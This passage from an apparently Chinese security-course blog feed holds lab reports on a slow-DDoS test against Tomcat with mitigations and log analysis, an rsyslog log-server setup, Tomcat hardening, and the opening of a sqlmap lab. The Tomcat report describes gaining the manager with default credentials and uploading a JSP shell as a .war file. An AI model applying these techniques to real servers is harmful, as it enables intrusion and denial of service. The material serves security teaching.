<li>目标机的 cpu 直接飚上 100%，Tomcat 的占用率直接提升至几乎 100%，证明此种攻击确实可以短时间内侵占服务器大量资源。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack2.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack3.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack4.png" class=""></div></div></div>
</li>
<li>网页也卡死在加载中了。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack5.png" class=""></li>
<li>断开攻击后，目标机的 cpu 立刻恢复原状，网页也可以打开了。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack6.png" class=""></li>
</ol>
<h2 id="附录（可选）">附录（可选）</h2>
<h3 id="问题回答">问题回答</h3>
<ol>
<li>
<p>了解原理后，应该通过什么方式来防范慢速 DDOS 攻击呢？</p>
<ul>
<li>
<p>前述工具是靠向目标网址 POST 一个请求，然后将请求拆分为一些极少量字符的 payload，且保持连接来占用目标服务器的资源。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/q1-1.png" class=""></p>
</li>
<li>
<p>这些请求具有很长的 <code>Content-length</code>，但每次只发一个字符，还被设定为 <code>keep-connection</code>，注定会占用很多资源。</p>
</li>
<li>
<p>前面的攻击参数中，<code>-r</code> 被设定为 201，是因为 tomcat 默认只支持同时支持 200 个连接，那么，把这个连接参数调大，一定程度上就可以缓解攻击，但这个方法并不是绝对的。</p>
</li>
<li>
<p>在 tomcat 配置文件 <code>server.xml</code> 中的 <code>&lt;Connector ... /&gt;</code> 配置中，和连接数相关的参数有：</p>
<ul>
<li><code>minProcessors</code>：最小空闲连接线程数，用于提高系统处理性能，默认值为 10</li>
<li><code>maxProcessors</code>：最大连接线程数，即：并发处理的最大请求数，默认值为 75</li>
<li><code>acceptCount</code>：允许的最大连接数，应大于等于 <code>maxProcessors</code>，默认值为 100</li>
<li><code>enableLookups</code>：是否反查域名，取值为：<code>true</code> 或 <code>false</code>。为了提高处理能力，应设置为 <code>false</code></li>
<li><code>connectionTimeout</code>：网络连接超时，单位：毫秒。设置为 <code>0</code> 表示永不超时，这样设置有隐患的。通常可设置为 <code>30000</code> 毫秒。</li>
</ul>
</li>
<li>
<p>原来 tomcat 最大连接数取决于 <code>maxConnections + acceptCount</code> 的值。如果要加大并发连接数，应同时加大这两个参数。</p>
</li>
<li>
<p>我们来看看原来这些参数被设定为了多少</p>
  <figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span></span></span><br><span class="line"><span class="tag"><span class="attr">connectionTimeout</span>=<span class="string">"20000"</span></span></span><br><span class="line"><span class="tag"><span class="attr">redirectPort</span>=<span class="string">"8443"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>没被指定，全为默认，我们改成这样：</p>
  <figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span></span></span><br><span class="line"><span class="tag"><span class="attr">connectionTimeout</span>=<span class="string">"5000"</span></span></span><br><span class="line"><span class="tag"><span class="attr">redirectPort</span>=<span class="string">"8443"</span></span></span><br><span class="line"><span class="tag"><span class="attr">maxConnections</span>=<span class="string">"10000"</span></span></span><br><span class="line"><span class="tag"><span class="attr">acceptCount</span>=<span class="string">"5000"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>再重新运行攻击脚本，参数不变。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/q1-2.png" class=""></li>
<li>服务器一定程度上还是顶住了一小下，但随着连接建立越来越多，还是撑不住了，CPU 处理率很快再次爆满。这种方法是治标不治本的。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>网站被攻击后，应该如何分析日志确定攻击者的 IP 呢？</p>
<ul>
<li>一般网站搭建软件都会提供访问日志记录功能，在类似于 <code>/logs</code> 的目录留下 log 文本文件。Tomcat 也提供了这样的机制，在<code>安装目录/logs/</code> 下存在着访问日志文件 <code>&lt;域名&gt;_access_log.&lt;date&gt;.log</code>，其中第一列记录了访问者的 IP 地址，双短横线后，紧接着是访问时间，然后是访问方式、访问地址、协议、状态码和返回字节数。从下图中的文件中，可以看出，刚才 <code>192.168.235.136</code> 在短时间内对网站首页 <code>/</code> 进行了大量的 <code>post</code> 操作，占用了大量资源，而这正好是刚才发动 Torshammer 攻击的机器的 IP。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/q2-1.png" class="">
</li>
<li>这个记录格式与 apache 和 nginx 都很像。只不过少了 <code>user-agent</code> 和 <code>referer</code> 信息。可以通过修改 <code>server.xml</code> 选项，加上一些信息来看看。比如把 <code>user-agent</code> 和 <code>referer</code> 加上。  <figure class="highlight xml"><figcaption><span>server.xml</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Valve</span> <span class="attr">className</span>=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span></span></span><br><span class="line"><span class="tag"><span class="attr">directory</span>=<span class="string">"logs"</span>  <span class="attr">prefix</span>=<span class="string">"localhost_access_log."</span> <span class="attr">suffix</span>=<span class="string">".txt"</span></span></span><br><span class="line"><span class="tag"><span class="attr">pattern</span>=<span class="string">"combined"</span> <span class="attr">resolveHosts</span>=<span class="string">"false"</span>  /&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>其中 <code>combined</code> 为 <code>%h %l %u %t "%r" %s %b "%{Referer}i" "%{User-Agent}i"</code></li>
</ul>
</li>
<li>重新设置后，现在能抓到日志如下 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/q2-2.png" class="">
<ul>
<li>显然，这个脚本使用了随机的 <code>user-agent</code>，所以不可能像限制爬虫名字一样，通过限制 <code>user-agent</code> 来抵抗此种攻击</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="本网站用到的架构相关资料">本网站用到的架构相关资料</h3>
<ul>
<li>SSH (Struts2+Spring+Hibernate) 框架 <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>
<ul>
<li>SSH 框架是由 struts2、spring、hibernate 三大框架组合起来的一套总框架。</li>
<li>浏览器（或客户端）发送请求到服务器，先经过项目中 <code>web.xml</code> 中过滤器（<code>&lt;filter&gt;</code> 和 <code>&lt;filter-mapping&gt;</code>）审核，通过了再发送给 <code>action</code> 包中的 <code>IndexAction</code> 类，<code>struts.xml</code> 根据 <code>IndexAction</code> 类中 <code>return</code> 的值再进行跳转，跳转的页面是 <code>struts.xml</code> 中 <code>&lt;result&gt;</code> 配置的页面名，然后页面响应回客户端。</li>
<li>Struts 是一个 Java Web MVC 开发框架。
<ul>
<li>模型 Model 用于封装与业务逻辑相关的数据和数据处理方法</li>
<li>视图 View 是数据的 HTML 展现</li>
<li>控制器 Controller 负责响应请求，协调 Model 和 View</li>
<li>Model、View 和 Controller 的分开，是一种典型的关注点分离的思想，不仅使得代码复用性和组织性更好，使得 Web 应用的配置性和灵活性更好。</li>
</ul>
</li>
<li>Spring 的核心思想：解耦，也就是代码中不出现 new 实现类的代码，我们创建了接口不用关心实现类是谁，实现类由 spring 帮我们注入，我们只需要在定义接口的时候给它一个 set 方法并且在配置文件里改 <code>&lt;property&gt;</code> 中的 id 和 ref 就行</li>
<li> Hibernate 的核心思想：(ORM - 对象关系映射) 连接数据库，我们不用在数据库写创建表的语句，数据库表的字段根据实体类中属性的名字然后我们在 <code>*.hbm.xml</code> 文件里配置 <code>&lt;property&gt;</code> 以及 <code>&lt;property&gt;</code> 的相关属性。</li>
</ul>
</li>
</ul>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>本部分资料来自 <a href="https://blog.csdn.net/u014577487/article/details/85558131">https://blog.csdn.net/u014577487/article/details/85558131</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>实验</category>
        <category>信息系统</category>
        <category>漏洞</category>
        <category>DDoS攻击</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>信息系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SOC 平台组建</title>
    <url>/2019/12/17/experiments/security/system/soc/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>掌握在 Ubuntu 系统中配置 java 环境的方法，学习配置一个日志服务器。</p>
<span id="more"></span>
<h2 id="实验内容">实验内容</h2>
<ol>
<li>使用 Ubuntu18.04 系统，在系统中安装 Java 开发环境</li>
<li>配置日志服务器</li>
</ol>
<h2 id="实验环境">实验环境</h2>
<img data-src="/2019/12/17/experiments/security/system/soc/system.png" class="" title="所用为Ubuntu系统">
<h2 id="实验要求">实验要求</h2>
<p>同（二）实验内容</p>
<h2 id="实验步骤和结果">实验步骤和结果</h2>
<h3 id="安装JDK">安装 JDK</h3>
<ol>
<li>本次选择将 jdk8 安装在 <code>/usr/local</code> 文件夹下。 <img data-src="/2019/12/17/experiments/security/system/soc/1.png" class=""></li>
<li>获取 <code>root</code> 权限，并解压 jdk 压缩包。 <img data-src="/2019/12/17/experiments/security/system/soc/2.png" class=""></li>
<li>使用 gedit 打开 <code>/etc/profile</code> 文件，在最后四行加入 Java 环境变量。利用 <code>source</code> 命令让 profile 文件生效。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk_1.8.0_191</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">${JAVA_HOME}</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:$[JAVA_HOME]/lib:<span class="variable">${JRE_HOME}</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">${JAVA_HOME}</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/12/17/experiments/security/system/soc/3.png" class=""> <img data-src="/2019/12/17/experiments/security/system/soc/4.png" class="">
</li>
<li>命令行中输入 <code>java -version</code>，测试安装效果和环境变量是否设置正确。 <img data-src="/2019/12/17/experiments/security/system/soc/5.png" class=""></li>
</ol>
<h3 id="配置SOC日志服务器">配置 SOC 日志服务器</h3>
<div class="tabs" id="soc"><ul class="nav-tabs"><li class="tab active"><a href="#soc-1">服务端</a></li><li class="tab"><a href="#soc-2">客户端</a></li></ul><div class="tab-content"><div class="tab-pane active" id="soc-1"><ol>
<li>编辑服务器端的 <code>/etc/rsyslog.conf</code> 文件，取消 <code>imtcp</code> 相关的注释并加入如下设置。 <img data-src="/2019/12/17/experiments/security/system/soc/6.png" class=""></li>
<li>查看服务端 IP，并开启 rsyslog 服务。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/8.png" class="" title="服务端IP"></div><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/7.png" class="" title="开启服务"></div></div></div>
</li>
</ol></div><div class="tab-pane" id="soc-2"><ol>
<li>编辑客户端的 <code>rsyslog.conf</code> 文件，作如下设置。<br>
<img data-src="/2019/12/17/experiments/security/system/soc/10.png" class=""> <div class="note info"><p>其中 192.168.235.146 是刚才服务器的地址。</p>
</div></li>
</ol>
</div>
2. 查看客户端 IP 并启动 rsyslog 服务。
    <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/9.png" class="" title="客户端IP"></div><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/11.png" class="" title="开启服务"></div></div></div></div></div>
<ol>
<li>在 client 端利用 logger 命令打日志，测试如下 <img data-src="/2019/12/17/experiments/security/system/soc/12.png" class=""></li>
<li>服务器端可以在 <code>/var/log</code> 下找到当前日期命名的 log 文件，其内容如下 <img data-src="/2019/12/17/experiments/security/system/soc/13.png" class=""></li>
<li>说明带有 <code>test_log</code> 标志的日志被成功记录，设置生效。</li>
<li>打一条不带 <code>test_log</code> 标志的记录，根据预期规则设置，此条 log 应该被丢弃。 <img data-src="/2019/12/17/experiments/security/system/soc/14.png" class=""></li>
<li>果然没有相应记录，规则生效。 <img data-src="/2019/12/17/experiments/security/system/soc/15.png" class=""></li>
</ol>
<h2 id="附录（可选）">附录（可选）</h2>
<p>思考题回答：</p>
<ol>
<li>
<p>ubuntu 中如何设置文件权限？</p>
<ul>
<li>
<p><code>chmod</code> 命令，根据命令帮助手册说明，我们可以使用 <code>chmod [八进制权限标识|权限赋值表达式] 文件1[,文件2,…]</code> 来改变某文件的权限。</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/set-priv.png" class="" title="八进制权限标识"></div><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/set-priv2.png" class="" title="权限赋值表达式"></div></div></div>
 <div class="note info"><p>权限标识中，<code>r</code> 代表读权限，值为 4；<code>w</code> 代表写权限，值为 2；<code>x</code> 代表执行权限，值为 1。权限赋值表达式中，可以使用 <code>+|-|=</code> 三种运算符为某一组用户赋值。</p>
</div>
</li>
</ul>
</li>
<li>
<p>如何关闭 rsyslog 服务？</p>
<ul>
<li>使用与开启 rsyslog 相似的命令（把 <code>start</code> 换成 <code>stop</code>）就可以关闭 rsyslog 服务，如果以非 root 用户身份运行，需要认证密码。 <img data-src="/2019/12/17/experiments/security/system/soc/stop-1.png" class=""></li>
<li>注意到上方输出中含有 “via systemctl” 的字样，通过查阅资料得知，Ubuntu Linux 在关闭服务时调用了 <code>systemd</code> 工具下的 <code>systemctl</code>，所以使用 <code>systemctl</code> 相关命令，应该有类似的效果。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/stop-2.png" class="" title="systemctl stop 服务名"></div><div class="group-picture-column"><img data-src="/2019/12/17/experiments/security/system/soc/stop-3.png" class="" title="service stop 服务名"></div></div></div>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>信息系统</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>信息系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat 安全性分析及安全配置</title>
    <url>/2019/12/06/experiments/security/system/tomcat/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>了解 Tomcat 存在的主要风险及问题。 了解并掌握 Tomcat 安全配置基本策略。</p>
<span id="more"></span>
<h2 id="实验内容">实验内容</h2>
<p>访问 Tomcat 的后台，了解后台暴露存在的问题，并尝试进行安全配置来修复这些问题。</p>
<h2 id="实验环境">实验环境</h2>
<p>运行 Tomcat8.0.30 的 Windows Server2012。</p>
<h2 id="实验要求">实验要求</h2>
<p>分析 tomcat 存在的风险，利用所学知识进行一些简单的安全配置。</p>
<h2 id="实验步骤与结果">实验步骤与结果</h2>

<ol>
<li>
<p>在 tomcat 中，除了根目录 <code>/</code> 以外，还存在 <code>docs</code> 和 <code>manager</code> 两个子目录，<code>docs</code> 存放 tomcat 的帮助文档，而 <code>manager</code> 是对 tomcat 服务器的 web 配置端，权限很大，如果配置不力，会带来安全隐患，假如默认用户名和密码再未更改，会相当危险。</p>
 <img data-src="/2019/12/06/experiments/security/system/tomcat/5.png" class="">
 <details class="note primary"><summary><p>提示</p>
</summary>
<p>这个配置文件在 tomcat 安装目录的 conf 文件夹下，现有版本下，如果 tomcat-users 没有加注释，那么使用 tomcat 作为用户名和密码，在拥有 manager-gui 权限（之前版本叫做 manager）的情况下，就可以通过 <code>ip:8080/manager</code> 访问 tomcat 的后台，具体如下。<br>
<img data-src="/2019/12/06/experiments/security/system/tomcat/6.png" class="" title="默认密码"><br>
<img data-src="/2019/12/06/experiments/security/system/tomcat/3.png" class=""><br>
<img data-src="/2019/12/06/experiments/security/system/tomcat/4.png" class=""></p>

</details>
</li>
<li>
<p>Deploy 这里更是漏洞连连，它甚至为我们提供了一个上传文件的地方，还可以自动部著，我们随便找一个文件，把它的后缀名改成<code>.war</code> 就可以传上去，（但是还是推荐标准命令打出来的 war 包：<code>jar -cvf</code>）这个<code>.war</code> 文件要是包含 <code>jsp</code> 木马，会引起不好的后果。</p>
 <img data-src="/2019/12/06/experiments/security/system/tomcat/1.png" class="" title="上传文件接口">
 <img data-src="/2019/12/06/experiments/security/system/tomcat/2.png" class="" title="上传了shell">
 <div class="note primary"><p>传上去的文件会在 webapps 下自动解压，接下来就可以通过 /shell 访问里面的内容。</p>
</div>
</li>
</ol>
<h2 id="附录（可选）">附录（可选）</h2>
<ol>
<li>
<p>如何禁止 Tomcat 列表显示文件？</p>
<ul>
<li>列表显示文件可以说又是一个暴露信息的漏洞，如果配置不当，假如网站主页文件坏掉，目录就会显示出来，造成非授权的浏览。 <img data-src="/2019/12/06/experiments/security/system/tomcat/10.png" class="" title="目录显示的不良后果">
</li>
<li>查看 <code>web.xml</code> 中对于 <code>listings</code> 的介绍，发现默认即为 <code>false</code>。保持即可，如果不是，在 <code>/conf/web.xml</code> 中 <code>&lt;servlet&gt;</code> 子项中将 <code>listings</code> 设置为 <code>false</code> 即可。 <img data-src="/2019/12/06/experiments/security/system/tomcat/7.png" class="" title="listing配置项介绍"> <img data-src="/2019/12/06/experiments/security/system/tomcat/8.png" class="" title="保持这里是false即可">
</li>
</ul>
</li>
<li>
<p>如何更改 Tomcat 服务器默认管理端口？</p>
<ul>
<li><code>/conf/server.xml</code> 中改变 <code>Connector</code> 的 port 值</li>
</ul>
</li>
<li>
<p>如何禁用不必要的 http 方法？</p>
<ul>
<li>服务器的 <code>/conf/web.xml</code> 中，作如下设置
<ul>
<li>更换标准 <figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span></span></span><br><span class="line"><span class="tag"><span class="attr">version</span>=<span class="string">"2.4"</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>添加设置 <figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>PUT<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>DELETE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>HEAD<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>OPTIONS<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">http-method</span>&gt;</span>TRACE<span class="tag">&lt;/<span class="name">http-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-resource-collection</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">auth-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">security-constraint</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">login-config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">auth-method</span>&gt;</span>BASIC<span class="tag">&lt;/<span class="name">auth-method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login-config</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>或对应用程序的 <code>web.xml</code> 做第二部分设置 <img data-src="/2019/12/06/experiments/security/system/tomcat/12.png" class=""></li>
</ul>
</li>
<li>使用 postman 做测试：对首页发起 PUT 请求，发现返回错误信息，说明配置成功。 <img data-src="/2019/12/06/experiments/security/system/tomcat/11.png" class=""></li>
</ul>
</li>
<li>
<p>如何禁用 webdav？</p>
 <details class="note info no-icon"><summary><p>什么是 webdav</p>
</summary>
<p>WebDAV（Web-based Distributed Authoring and Versioning）是一种基于 HTTP 1.1 协议的通信协议。它扩展了 HTTP 1.1，在 GET、POST、HEAD 等几个 HTTP 标准方法以外添加了一些新的方法，使应用程序可直接对 Web Server 直接读写，并支持写文件锁定 (Locking) 及解锁 (Unlock)，还可以支持文件的版本控制。</p>

</details>
<p>HTTP/1.1 协议中共定义了八种方法（有时也叫 “动作”）来表明 Request-URI 指定的资源的不同操作方式：</p>
 <div class="tabs" id="http"><ul class="nav-tabs"><li class="tab active"><a href="#http-1">OPTIONS</a></li><li class="tab"><a href="#http-2">HEAD</a></li><li class="tab"><a href="#http-3">GET</a></li><li class="tab"><a href="#http-4">POST</a></li><li class="tab"><a href="#http-5">PUT</a></li><li class="tab"><a href="#http-6">DELETE</a></li><li class="tab"><a href="#http-7">TRACE</a></li><li class="tab"><a href="#http-8">CONNECT</a></li></ul><div class="tab-content"><div class="tab-pane active" id="http-1"><p>返回服务器针对特定资源所支持的 HTTP 请求方法。也可以利用向 Web 服务器发送’*' 的请求来测试服务器的功能性。</p></div><div class="tab-pane" id="http-2"><p>HEAD 向服务器索要与 GET 请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</p></div><div class="tab-pane" id="http-3"><p>GET 向特定的资源发出请求。注意：GET 方法不应当被用于产生 “副作用” 的操作中，例如在 web app 中。其中一个原因是 GET 可能会被网络蜘蛛等随意访问。</p></div><div class="tab-pane" id="http-4"><p>POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和 / 或已有资源的修改。</p></div><div class="tab-pane" id="http-5"><p>PUT 向指定资源位置上传其最新内容。</p></div><div class="tab-pane" id="http-6"><p>DELETE 请求服务器删除 Request-URI 所标识的资源。</p></div><div class="tab-pane" id="http-7"><p>TRACE 回显服务器收到的请求，主要用于测试或诊断。</p></div><div class="tab-pane" id="http-8"><p>CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</p></div></div></div>
<ul>
<li>方法名称是区分大小写的。当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码 405（Method Not Allowed）；当服务器不认识或者不支持对应的请求方法的时候，应当返回状态码 501（Not Implemented）。</li>
<li>HTTP 服务器至少应该实现 GET 和 HEAD 方法，其他方法都是可选的。当然，所有的方法支持的实现都应当符合下述的方法各自的语义定义。此外，除了上述方法，特定的 HTTP 服务能够扩展自定义的方法。</li>
<li>HTTP 的访问中，一般常用的两个方法是：GET 和 POST。其实主要是针对 DELETE 等方法的禁用。所以，本题答案与 3 一样</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>信息系统</category>
        <category>漏洞</category>
        <category>Tomcat配置</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>信息系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 网站搭建和 SQLMAP 工具使用</title>
    <url>/2019/10/24/experiments/security/system/using-php-sqlmap/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<ol>
<li>了解搭建网站的一般流程，学习使用 PHPStudy 来搭建网站。</li>
<li>了解 SQLMap 工具的原理和应用，利用 sqlmap 寻找数据库的注入漏洞。</li>
</ol>
<span id="more"></span>
<h2 id="实验内容">实验内容</h2>
<ol>
<li>使用 PhpStudy 和金戈企业建站框架搭建网站服务。</li>
<li>使用 sqlmap 工具扫描该网站，寻找 sql 漏洞利用点。</li>
</ol>
<h2 id="实验环境">实验环境</h2>
<img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/env.jpg" class="">
<h2 id="实验要求">实验要求</h2>
<div class="tabs" id="requirements"><ul class="nav-tabs"><li class="tab active"><a href="#requirements-1">PHPStudy 搭建网站</a></li><li class="tab"><a href="#requirements-2">Sqlmap 实验</a></li></ul><div class="tab-content"><div class="tab-pane active" id="requirements-1"><ol>
<li>将服务器的端口更换为 8080，域名修改为 <code><a href="http://www.test.com">www.test.com</a></code>。网站搭建成功后，通过在浏览器中访问 <code><a href="http://www.test.com">www.test.com</a></code>访问这个网站。</li>
<li>通过端口扫描工具扫描整个网站所开设的端口。看网站是否在 8080 端口提供服务。</li>
</ol></div><div class="tab-pane" id="requirements-2"><p>根据实验指导书进行操作</p></div></div></div>
<h2 id="实验步骤和结果">实验步骤和结果</h2>
<h3 id="网站准备">网站准备</h3>
<ol>
<li>
<p>安装 PHPStudy</p>
<ul>
<li>点击桌面上的 phpstudysetup 安装包，并为其指定一个合适的解压位置。等待其安装完毕</li>
</ul>
	<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%991.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%992.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%993.png" class=""></div></div></div>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%994.png" class="" title="PHPStudy主界面">
</li>
<li>
<p>配置 PHPStudy</p>
<ul>
<li>设置好网站目录、端口，然后点击 “应用”。Apache 会重启 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%995.png" class="" title="设置端口"></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%996.png" class="" title="设置网站目录"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%997.png" class="" title="Apache部分设置全览"></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%998.png" class=""></div></div></div>
</li>
</ul>
</li>
<li>
<p>配置域名</p>
<ol>
<li>从主界面中进入站点域名管理界面。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%999.png" class="" title="域名管理界面"></li>
<li>配置好域名后，点击 “新增”。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9910.png" class=""> <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9911.png" class="" title="左侧“站点”栏中出现了新建的站点"></li>
<li>修改 hosts 文件，将刚刚起好的域名解析到本地 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9912.png" class="" title="添加一行127.0.0.1 <域名>"></li>
<li>测试访问效果 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9913.png" class=""></li>
</ol>
</li>
<li>
<p>将网站切换到 8080 端口上</p>
<ol>
<li>
<p>打开域名管理界面，把域名改为要求的 <code>www.test.com</code>，端口设为 <code>8080</code>，然后点击修改。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9914.png" class=""> <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9915.png" class="" title="要修改的项目"></p>
</li>
<li>
<p>相应的 host 中的域名要变一下。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9916.png" class="" title="添加或修改成127.0.0.1 www.test.com"></p>
</li>
<li>
<p>Apache 中的 httpd 端口也要修改。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9917.png" class="" title="改为8080"></p>
</li>
<li>
<p>此时再直接输入 <code>www.test.com</code> 就进不去了，得加上端口号才可以访问那个网站。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9918.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9919.png" class=""></div></div></div>
</li>
<li>
<p>此时进行端口扫描，会发现网站的 8080 端口是开启的。</p>
<div class="note default"><p>192.168.235.138 是 web 服务器的 ip 地址</p>
</div>
<img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E5%BB%BA%E7%AB%9920.png" class="">
</li>
</ol>
</li>
</ol>
<h3 id="SQLMap初使用">SQLMap 初使用</h3>
<div class="note info"><p>Sqlmap 是一款由 Python 语言开发的自动化 SQL 注入工具，其主要功能是扫描、发现并利用给定的 URL 的 SQL 注入漏洞。</p>
<p>本次我们使用 Sqlmap 工具寻找前一步搭建好的网站系统的 SQL 注入漏洞。</p>
</div>
<ol>
